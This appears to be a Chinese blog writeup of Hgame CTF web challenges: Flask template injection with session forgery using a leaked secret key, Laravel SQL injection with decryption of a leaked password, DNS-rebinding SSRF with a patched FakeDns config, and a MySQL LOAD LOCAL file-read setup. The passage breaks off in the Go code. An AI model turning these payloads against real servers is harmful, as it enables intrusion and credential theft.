<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>Hgame Writeup - rmb122's notebook</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="happyPython
随便 fuzz 一下发现 404 页面有模板注入, http://118.25.18.223:3001/asd%7B%7Bconfig%7D%7D.
拿到 'SECRET_KEY': '9RxdzNwq7!nOoK3*', 把 session 里的 user_id 改成 1 就行了.

"><meta property="og:image" content><meta property="og:title" content="Hgame Writeup"><meta property="og:description" content="happyPython
随便 fuzz 一下发现 404 页面有模板注入, http://118.25.18.223:3001/asd%7B%7Bconfig%7D%7D.
拿到 'SECRET_KEY': '9RxdzNwq7!nOoK3*', 把 session 里的 user_id 改成 1 就行了.

"><meta property="og:type" content="article"><meta property="og:url" content="https://rmb122.com/2019/03/09/Hgame-Writeup/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2019-03-09T00:45:02+00:00"><meta property="article:modified_time" content="2019-03-09T00:45:02+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Hgame Writeup"><meta name=twitter:description content="happyPython
随便 fuzz 一下发现 404 页面有模板注入, http://118.25.18.223:3001/asd%7B%7Bconfig%7D%7D.
拿到 'SECRET_KEY': '9RxdzNwq7!nOoK3*', 把 session 里的 user_id 改成 1 就行了.

"><script src=https://rmb122.com/js/feather.min.js></script>
<link rel=stylesheet type=text/css media=screen href=https://rmb122.com/css/main.21410c161c7e5bcadc5a4eccf49ce5a024e0e8fc19babbd534cfe87972f5ee51.css><link id=darkModeStyle rel=stylesheet type=text/css href=https://rmb122.com/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css disabled></head><body><div class=content><header><div class=main><a href=https://rmb122.com/>rmb122's notebook</a></div><nav><a href=/>首页</a>&nbsp;
<a href=/posts>归档</a>&nbsp;
<a href=/tags>标签</a>&nbsp;
<a href=/links>友链</a>&nbsp;
<a href=/about>关于</a>
| <a id=dark-mode-toggle onclick=toggleTheme() href></a>
<script src=https://rmb122.com/js/themetoggle.js></script></nav></header><main><article><div class=title><h1 class=title>Hgame Writeup</h1><div class=meta>发表于 2019 年 3 月 9 日</div></div><section class=body><h2 id=happypython>happyPython</h2><p>随便 fuzz 一下发现 404 页面有模板注入, http://118.25.18.223:3001/asd%7B%7Bconfig%7D%7D.<br>拿到 <code>'SECRET_KEY': '9RxdzNwq7!nOoK3*'</code>, 把 session 里的 user_id 改成 <code>1</code> 就行了.
<img src=https://i.loli.net/2019/03/21/5c93a6120d105.png alt>
<img src=https://i.loli.net/2019/03/21/5c93a611dc09d.png alt></p><h2 id=happyphp>happyPHP</h2><p><code>users</code> 页面有源码泄露, <code>https://github.com/Lou00/laravel</code>.<br>审计源码发现 <code>SessionsController.php</code> 直接拼接 sql 语句, 存在注入.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#ff79c6>class</span> <span style=color:#50fa7b>SessionsController</span> <span style=color:#ff79c6>extends</span> Controller
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>public</span> <span style=color:#ff79c6>function</span> <span style=color:#50fa7b>store</span>(Request <span style=color:#8be9fd;font-style:italic>$request</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>$credentials</span> <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>$this</span><span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>validate</span>(<span style=color:#8be9fd;font-style:italic>$request</span>, [
</span></span><span style=display:flex><span>            <span style=color:#f1fa8c>&#39;email&#39;</span> <span style=color:#ff79c6>=&gt;</span> <span style=color:#f1fa8c>&#39;required|email|max:100&#39;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f1fa8c>&#39;password&#39;</span> <span style=color:#ff79c6>=&gt;</span> <span style=color:#f1fa8c>&#39;required&#39;</span>
</span></span><span style=display:flex><span>        ]);
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> (Auth<span style=color:#ff79c6>::</span><span style=color:#50fa7b>attempt</span>(<span style=color:#8be9fd;font-style:italic>$credentials</span>)) {
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>if</span> (Auth<span style=color:#ff79c6>::</span><span style=color:#50fa7b>user</span>()<span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>id</span> <span style=color:#ff79c6>===</span><span style=color:#bd93f9>1</span>){
</span></span><span style=display:flex><span>                session()<span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>flash</span>(<span style=color:#f1fa8c>&#39;info&#39;</span>,<span style=color:#f1fa8c>&#39;flag :******&#39;</span>);
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>return</span> redirect()<span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>route</span>(<span style=color:#f1fa8c>&#39;users.show&#39;</span>);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            <span style=color:#8be9fd;font-style:italic>$name</span> <span style=color:#ff79c6>=</span> DB<span style=color:#ff79c6>::</span><span style=color:#50fa7b>select</span>(<span style=color:#f1fa8c>&#34;SELECT name FROM `users` WHERE `name`=&#39;&#34;</span><span style=color:#ff79c6>.</span>Auth<span style=color:#ff79c6>::</span><span style=color:#50fa7b>user</span>()<span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>name</span><span style=color:#ff79c6>.</span><span style=color:#f1fa8c>&#34;&#39;&#34;</span>);
</span></span><span style=display:flex><span>            session()<span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>flash</span>(<span style=color:#f1fa8c>&#39;info&#39;</span>, <span style=color:#f1fa8c>&#39;hello &#39;</span><span style=color:#ff79c6>.</span><span style=color:#8be9fd;font-style:italic>$name</span>[<span style=color:#bd93f9>0</span>]<span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>name</span>);
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>return</span> redirect()<span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>route</span>(<span style=color:#f1fa8c>&#39;users.show&#39;</span>);
</span></span><span style=display:flex><span>        } <span style=color:#ff79c6>else</span> {
</span></span><span style=display:flex><span>            session()<span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>flash</span>(<span style=color:#f1fa8c>&#39;danger&#39;</span>, <span style=color:#f1fa8c>&#39;sorry,login failed&#39;</span>);
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>return</span> redirect()<span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>back</span>()<span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>withInput</span>();
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>public</span> <span style=color:#ff79c6>function</span> <span style=color:#50fa7b>destroy</span>()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        Auth<span style=color:#ff79c6>::</span><span style=color:#50fa7b>logout</span>();
</span></span><span style=display:flex><span>        session()<span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>flash</span>(<span style=color:#f1fa8c>&#39;success&#39;</span>, <span style=color:#f1fa8c>&#39;logout success&#39;</span>);
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> redirect(<span style=color:#f1fa8c>&#39;login&#39;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>注册名称为 <code>123' union select password from users where id =1#</code>,<br>就可以拿到管理员的加密过的密码</p><p><img src=https://i.loli.net/2019/03/21/5c93a611b6a32.png alt><br><img src=https://i.loli.net/2019/03/21/5c93a63b613bd.png alt></p><p>同理 <code>123' union select email from users where id =1#</code><br>拿到 email <code>admin@hgame.com</code></p><p>config/app.php 可以找到加密方式 <code>'cipher' => 'AES-256-CBC'</code>,<br>秘钥来自环境变量 <code>env('APP_KEY')</code>,<br>查找 git 的记录, 发现被删掉的 <code>.env</code><br><code>APP_KEY=base64:9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ=</code>,<br>用这个来解密就可以了</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>php &gt; echo openssl_decrypt(&#34;EaR\/4fldOGP1G\/aDK8e8u1Aldmxl+yB3s+kBAaoPods=&#34;,&#39;AES-256-CBC&#39;,base64_decode(&#39;9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ=&#39;),0,base64_decode(&#39;rnVrqfCvfJgnvSTi9z7KLw==&#39;));
</span></span><span style=display:flex><span>s:16:&#34;9pqfPIer0Ir9UUfR&#34;;
</span></span></code></pre></div><p>登录后就是 flag~</p><h2 id=happyjava>happyJava</h2><p>这题有点坑 233, 提示放出来才做出来.<br>提示: <code>spring-boot-actuator</code><br>查了一下, fuzz /monitor /actuator 等等都没有,<br>随缘扫了一下端口找到 <code>9876</code> 端口开着 http, 竟然正是这个 spring-boot-actuator<br>访问 <code>http://119.28.26.122:9876/mappings</code> 就可以拿到所有的路由</p><p><img src=https://i.loli.net/2019/03/21/5c93a6119f52e.png alt></p><p>题目是这两个 <code>/you_will_never_find_this_interface</code>, <code>/secret_flag_here</code>,<br>看了一下是 SSRF, 试了一会发现 DNS 请求会请求两次, 可以采用 DNS Rebinding,<br>因为后面可以拿 Shell 下题目, 我就直接给大家看题目源码了</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>@GetMapping<span style=color:#ff79c6>(</span>path<span style=color:#ff79c6>={</span><span style=color:#f1fa8c>&#34;/you_will_never_find_this_interface&#34;</span><span style=color:#ff79c6>})</span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> String <span style=color:#50fa7b>YouWillNeverFindThisInterface</span><span style=color:#ff79c6>(</span>@RequestParam<span style=color:#ff79c6>(</span>value<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;url&#34;</span><span style=color:#ff79c6>,</span> defaultValue<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;&#34;</span><span style=color:#ff79c6>)</span> String url<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>url<span style=color:#ff79c6>.</span><span style=color:#50fa7b>isEmpty</span><span style=color:#ff79c6>())</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> <span style=color:#f1fa8c>&#34;`url` cant be empty!&#34;</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>try</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    URL u <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> URL<span style=color:#ff79c6>(</span>url<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    String domain <span style=color:#ff79c6>=</span> u<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getHost</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    String ip <span style=color:#ff79c6>=</span> InetAddress<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getByName</span><span style=color:#ff79c6>(</span>domain<span style=color:#ff79c6>).</span><span style=color:#50fa7b>getHostAddress</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>ip<span style=color:#ff79c6>.</span><span style=color:#50fa7b>equals</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;127.0.0.1&#34;</span><span style=color:#ff79c6>))</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> <span style=color:#f1fa8c>&#34;Dont be evil. Dont request 127.0.0.1.&#34;</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>    URLConnection connection <span style=color:#ff79c6>=</span> u<span style=color:#ff79c6>.</span><span style=color:#50fa7b>openConnection</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    connection<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setConnectTimeout</span><span style=color:#ff79c6>(</span>5000<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    connection<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setReadTimeout</span><span style=color:#ff79c6>(</span>5000<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    BufferedReader in <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> BufferedReader<span style=color:#ff79c6>(</span><span style=color:#ff79c6>new</span> InputStreamReader<span style=color:#ff79c6>(</span>connection<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getInputStream</span><span style=color:#ff79c6>()));</span>
</span></span><span style=display:flex><span>    StringBuilder sb <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> StringBuilder<span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    String current<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>while</span> <span style=color:#ff79c6>((</span>current <span style=color:#ff79c6>=</span> in<span style=color:#ff79c6>.</span><span style=color:#50fa7b>readLine</span><span style=color:#ff79c6>())</span> <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        sb<span style=color:#ff79c6>.</span><span style=color:#50fa7b>append</span><span style=color:#ff79c6>(</span>current<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> sb<span style=color:#ff79c6>.</span><span style=color:#50fa7b>toString</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>catch</span> <span style=color:#ff79c6>(</span>Exception e<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> <span style=color:#f1fa8c>&#34;emmmmmmm, something went wrong: &#34;</span> <span style=color:#ff79c6>+</span> e<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getMessage</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>注意 <code>String ip = InetAddress.getByName(domain).getHostAddress();</code> 和 <code>URLConnection connection = u.openConnection();</code>.<br>在拿到 ip 以后, 是直接再用原来的链接打开, 而不是通过 ip 访问. 也就是说, 这里其实解析了两次域名 (如果没有缓存的话, 这个下面说)<br>这给我们了机会来绕过检测, 我们只要让 DNS 第一次返回一个不是 127.0.0.1 的地址, 第二次再返回 127.0.0.1 即可. 这样 u.openConnection 将会链接 127.0.0.1, 实现 SSRF.<br>可以直接在 Github 上找到已有的<a href=https://github.com/Crypt0s/FakeDns>项目</a>, 试了一下还是不错的. 不过在这个题目下使用有点小问题, 题目这里设置的 DNS 服务器是 8.8.8.8, 而 8.8.8.8 在递归的时候请求了一个不支持的类型 \x00\xff, 查了一下 RFC, 是这个</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>3.2.3. QTYPE values
</span></span><span style=display:flex><span>QTYPE fields appear in the question part of a query.  QTYPES are a
</span></span><span style=display:flex><span>superset of TYPEs, hence all TYPEs are valid QTYPEs.  In addition, the
</span></span><span style=display:flex><span>following QTYPEs are defined:
</span></span><span style=display:flex><span>AXFR            252 A request for a transfer of an entire zone
</span></span><span style=display:flex><span>MAILB           253 A request for mailbox-related records (MB, MG or MR)
</span></span><span style=display:flex><span>MAILA           254 A request for mail agent RRs (Obsolete - see MX)
</span></span><span style=display:flex><span>*               255 A request for all records
</span></span></code></pre></div><p>请求所有记录, 还好不是什么奇葩的, 我们稍微修改一下, 正常返回 A 记录即可.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff><span style=display:flex><span><span style=font-weight:700>@@ -52,7 +53,8 @@ 
</span></span></span><span style=display:flex><span><span style=font-weight:700></span>TYPE = {
</span></span><span style=display:flex><span>     &#34;\x00\x0c&#34;: &#34;PTR&#34;,
</span></span><span style=display:flex><span>     &#34;\x00\x10&#34;: &#34;TXT&#34;,
</span></span><span style=display:flex><span>     &#34;\x00\x0f&#34;: &#34;MX&#34;,
</span></span><span style=display:flex><span><span style=color:#f55>-    &#34;\x00\x06&#34;: &#34;SOA&#34;
</span></span></span><span style=display:flex><span><span style=color:#f55></span><span style=color:#50fa7b;font-weight:700>+    &#34;\x00\x06&#34;: &#34;SOA&#34;,
</span></span></span><span style=display:flex><span><span style=color:#50fa7b;font-weight:700>+    &#34;\x00\xff&#34;: &#34;A&#34;
</span></span></span><span style=display:flex><span><span style=color:#50fa7b;font-weight:700></span> }
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span> # Stolen:
</span></span><span style=display:flex><span><span style=font-weight:700>@@ -346,6 +348,7 @@ 
</span></span></span><span style=display:flex><span><span style=font-weight:700></span>CASE = {
</span></span><span style=display:flex><span>     &#34;\x00\x0c&#34;: PTR,
</span></span><span style=display:flex><span>     &#34;\x00\x10&#34;: TXT,
</span></span><span style=display:flex><span>     &#34;\x00\x06&#34;: SOA,
</span></span><span style=display:flex><span><span style=color:#50fa7b;font-weight:700>+    &#34;\x00\xff&#34;: A,
</span></span></span><span style=display:flex><span><span style=color:#50fa7b;font-weight:700></span> }
</span></span></code></pre></div><p>然后设置 conf</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ cat dns.conf
</span></span><span style=display:flex><span>A .* 1.1.1.1,127.0.0.1
</span></span></code></pre></div><p>就可以啦, 这样第一次请求返回 <code>1.1.1.1</code>, 第二次 <code>127.0.0.1</code>, 绕过了检测.<br>再说说缓存, 为了加快请求速度, 现在的操作系统都会将上次请求保存下来, 在一段时间内都会使用第一次请求的结果. 所以这种方式也有对应的局限. 我们可以看看题目的设置</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>@SpringBootApplication
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>class</span> <span style=color:#50fa7b>HappyjavaApplication</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>  <span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>static</span> <span style=color:#8be9fd>void</span> <span style=color:#50fa7b>main</span><span style=color:#ff79c6>(</span>String<span style=color:#ff79c6>[]</span> args<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>  <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    Security<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setProperty</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;networkaddress.cache.negative.ttl&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#f1fa8c>&#34;0&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    Security<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setProperty</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;networkaddress.cache.ttl&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#f1fa8c>&#34;0&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    System<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setProperty</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;sun.net.spi.nameservice.nameservers&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#f1fa8c>&#34;8.8.8.8&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    System<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setProperty</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;sun.net.spi.nameservice.provider.1&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#f1fa8c>&#34;dns,sun&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    SpringApplication<span style=color:#ff79c6>.</span><span style=color:#50fa7b>run</span><span style=color:#ff79c6>(</span>HappyjavaApplication<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>,</span> args<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>  <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>是将 <code>networkaddress.cache.ttl</code> 设到了 0, 相当于关闭了缓存, 所以才能这么玩 233</p><p>接下来访问 <code>/secret_flag_here</code>, 是个解析 json 的界面, 当时目测就是 fastjsonRCE, 挺久之前的洞了, 网上有很多文章, 这里就不多说了. 需要注意一下 URL 需要二次编码以及题目限制了 <code>TemplatesImpl</code> 的使用</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>@GetMapping<span style=color:#ff79c6>(</span>path<span style=color:#ff79c6>={</span><span style=color:#f1fa8c>&#34;/secret_flag_here&#34;</span><span style=color:#ff79c6>})</span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> String <span style=color:#50fa7b>SecretFlagHere</span><span style=color:#ff79c6>(</span>@RequestParam<span style=color:#ff79c6>(</span>value<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;data&#34;</span><span style=color:#ff79c6>,</span> defaultValue<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;&#34;</span><span style=color:#ff79c6>)</span> String data<span style=color:#ff79c6>,</span> HttpServletRequest request<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    String ip <span style=color:#ff79c6>=</span> request<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getRemoteAddr</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(!</span>ip<span style=color:#ff79c6>.</span><span style=color:#50fa7b>equals</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;127.0.0.1&#34;</span><span style=color:#ff79c6>))</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>      <span style=color:#ff79c6>return</span> <span style=color:#f1fa8c>&#34;This is danger interface, only allow request from 127.0.0.1!&lt;br/&gt;Your IP:&#34;</span> <span style=color:#ff79c6>+</span> ip<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>data<span style=color:#ff79c6>.</span><span style=color:#50fa7b>equals</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;&#34;</span><span style=color:#ff79c6>))</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>      <span style=color:#ff79c6>return</span> <span style=color:#f1fa8c>&#34;data cant be empty!&#34;</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>((</span>data<span style=color:#ff79c6>.</span><span style=color:#50fa7b>contains</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;TemplatesImpl&#34;</span><span style=color:#ff79c6>))</span> <span style=color:#ff79c6>&amp;&amp;</span> <span style=color:#ff79c6>(</span>data<span style=color:#ff79c6>.</span><span style=color:#50fa7b>contains</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;@type&#34;</span><span style=color:#ff79c6>)))</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>      <span style=color:#ff79c6>return</span> <span style=color:#f1fa8c>&#34;Evil hacker?&#34;</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>try</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>      object <span style=color:#ff79c6>=</span> JSON<span style=color:#ff79c6>.</span><span style=color:#50fa7b>parse</span><span style=color:#ff79c6>(</span>data<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>catch</span> <span style=color:#ff79c6>(</span>Exception e<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>      Object object<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>      <span style=color:#ff79c6>return</span> <span style=color:#f1fa8c>&#34;Invalid JSON string!&#34;</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>    Object object<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>    String result <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;WoW! Convert JSON to object...OK!&#34;</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>    result <span style=color:#ff79c6>=</span> result <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;&lt;br&gt;Result: &#34;</span> <span style=color:#ff79c6>+</span> object<span style=color:#ff79c6>.</span><span style=color:#50fa7b>toString</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>	<span style=color:#ff79c6>return</span> result<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><h2 id=happygo>happyGo</h2><p>继续代码审计 233<br>题目说 flag 在 /flag, 而看了一圈并没有任意文件读取之类的.<br>但是这里注意到 <code>model.go</code> 中的 <code>orm.RegisterDataBase("default", "mysql", fmt.Sprintf("%s:%s@tcp(%s:%s)/%s?allowAllFiles=true", username, password, host, port, database))</code>
中的 <code>allowAllFiles=true</code>, 这允许我们 <code>LOAD LOCAL FILE</code>, 这里就要谈到一种攻击方式, 大家可以看<a href=http://aq.mk/index.php/archives/23/>这里</a><br>接下来就要想办法覆盖掉配置文件, 让服务端连接我们的恶意服务器</p><p>第一个漏洞点在 <code>userinfo.go</code>,</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=display:flex><span>c.<span style=color:#50fa7b>SaveToFile</span>(<span style=color:#f1fa8c>&#34;uploadname&#34;</span>, <span style=color:#f1fa8c>&#34;static/uploads/&#34;</span> <span style=color:#ff79c6>+</span> h.Filename)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>o <span style=color:#ff79c6>:=</span> orm.<span style=color:#50fa7b>NewOrm</span>()
</span></span><span style=display:flex><span>u <span style=color:#ff79c6>:=</span> models.Users{Id: uid.(<span style=color:#8be9fd>int</span>)}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>err = o.<span style=color:#50fa7b>Read</span>(<span style=color:#ff79c6>&amp;</span>u)
</span></span><span style=display:flex><span><span style=color:#ff79c6>if</span> err <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>nil</span> {
</span></span><span style=display:flex><span>    c.<span style=color:#50fa7b>Abort</span>(<span style=color:#f1fa8c>&#34;500&#34;</span>)
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>u.Avatar = <span style=color:#f1fa8c>&#34;/static/uploads/&#34;</span> <span style=color:#ff79c6>+</span> h.Filename
</span></span><span style=display:flex><span>_, err = o.<span style=color:#50fa7b>Update</span>(<span style=color:#ff79c6>&amp;</span>u)
</span></span><span style=display:flex><span><span style=color:#ff79c6>if</span> err <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>nil</span> {
</span></span><span style=display:flex><span>    c.<span style=color:#50fa7b>Abort</span>(<span style=color:#f1fa8c>&#34;500&#34;</span>)
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>c.<span style=color:#50fa7b>Redirect</span>(<span style=color:#f1fa8c>&#34;/userinfo&#34;</span>, http.StatusFound)
